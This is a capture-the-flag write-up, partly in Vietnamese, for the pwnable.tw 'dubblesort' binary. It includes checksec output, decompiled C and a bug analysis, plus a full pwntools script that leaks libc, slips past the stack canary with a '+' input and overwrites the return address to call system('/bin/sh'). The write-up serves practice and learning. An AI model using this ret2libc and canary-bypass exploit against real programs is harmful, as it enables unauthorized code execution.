# dubblesort

## file

```shell
➜ dubblesort ⚡                                                                                                22:00:27
▶ file dubblesort
dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped

➜ dubblesort ⚡                                                                                                22:02:41
▶ checksec dubblesort
[*] '/mnt/d/pwn_myself/pwnable_tw/dubblesort/dubblesort'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```

## source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  _BYTE *v4; // edi
  unsigned int i; // esi
  unsigned int j; // esi
  int result; // eax
  unsigned int v8; // [esp+18h] [ebp-74h] BYREF
  _BYTE v9[32]; // [esp+1Ch] [ebp-70h] BYREF
  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
  unsigned int v11; // [esp+7Ch] [ebp-10h]

  v11 = __readgsdword(0x14u);
  sub_8B5();
  __printf_chk(1, "What your name :");
  read(0, buf, 0x40u);
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &v8);
  v3 = v8;
  if ( v8 )
  {
    v4 = v9;
    for ( i = 0; i < v8; ++i )
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", v4);
      v3 = v8;
      v4 += 4;
    }
  }
  sub_931(v9, v3);
  puts("Result :");
  if ( v8 )
  {
    for ( j = 0; j < v8; ++j )
      __printf_chk(1, "%u ");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v11 )
    sub_BA0();
  return result;
}


unsigned int __cdecl sub_931(unsigned int *a1, int a2)
{
  int v2; // ecx
  int i; // edi
  unsigned int v4; // edx
  unsigned int v5; // esi
  unsigned int *v6; // eax
  unsigned int result; // eax
  unsigned int v8; // [esp+1Ch] [ebp-20h]

  v8 = __readgsdword(0x14u);
  puts("Processing......");
  sleep(1u);
  if ( a2 != 1 )
  {
    v2 = a2 - 2;
    for ( i = (int)&a1[a2 - 1]; ; i -= 4 )
    {
      if ( v2 != -1 )
      {
        v6 = a1;
        do
        {
          v4 = *v6;
          v5 = v6[1];
          if ( *v6 > v5 )
          {
            *v6 = v5;
            v6[1] = v4;
          }
          ++v6;
        }
        while ( (unsigned int *)i != v6 );
        if ( !v2 )
          break;
      }
      --v2;
    }
  }
  result = __readgsdword(0x14u) ^ v8;
  if ( result )
    sub_BA0();
  return result;
}

```

## analysis

- bug ở read, có thể read, tuy nhiên print_chk chống overflow => chỉ có thể print đủ 64 bytes
- bug ở việc chỉ khai báo mảng nhập vô 8 phần tử (32/4) nhưng vẹo nào không filter, nên có thể ghi đè lên stack => ghi đc lên ret 
- **nên nhớ đang phân tích file 64 hay 32-bit để cân nhắc việc leak cho thỏa đáng bởi 32bit thì không cần đưa tham số lên các thanh ghi nên trong bài này không cần leak pie, k cần pop_rdi, chỉ cần leak libc base là xong**


## exploit

***chả hiểu sau mình không exploit trên remote được mặc dù đúng thư viện và mọi thứ okela với local :((***

Cơ mà mình thử các wu của ng khác vẫn ik thể nên maybe lỗi từ remote

À đừng quên pwninit các thứ để có được dubblesort_patched, xem lại bài [này](https://hjn4pwn.github.io/Huyna-blog.github.io/blogs/PWN/Pwn_Pico/herelibc_challenge.html)

```python
from pwn import *

binary = ELF("./dubblesort_patched")
libc = ELF("./libc_32.so.6")

context.binary = binary


def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10101)
    else:
        r = process([binary.path])
        #if args.DEBUG:
        #gdb.attach(r, api=True)
    return r


def main():
    r = conn()

    payload = "a"*24
    r.sendlineafter("What your name :" ,payload)
    # log.info("Debugging...")
    # sleep(10)
    r.recvuntil("a"*24)
    leak = u32(r.recv(4))

    log.info("Recv: " + hex(leak))

    libcbase = leak - 0x1b0000 - 0xa
    log.info("Libc base addr: " + hex(libcbase))

    system_offset = libc.symbols[b'system']
    binsh_offset = next(libc.search(b'/bin/sh\x00'))

    system_addr = libcbase + system_offset
    binsh_addr = libcbase + binsh_offset
    log.info("System offset: " + str(system_addr))
    log.info("/bin/sh base offset: " + str(binsh_addr))


    r.sendlineafter("sort :" , "35")

    for i in range(24):
        r.sendlineafter("number : " ,'1')

    r.sendlineafter("number : " ,'+') #canary

    for i in range(9):
        r.sendlineafter("number : " ,str(system_addr))

    for i in range(1):
        r.sendlineafter("number : " ,str(binsh_addr))

    #print(r.recv())
    #r.sendline("ls; cat flag.txt")
    r.interactive()


if __name__ == "__main__":
    main()


```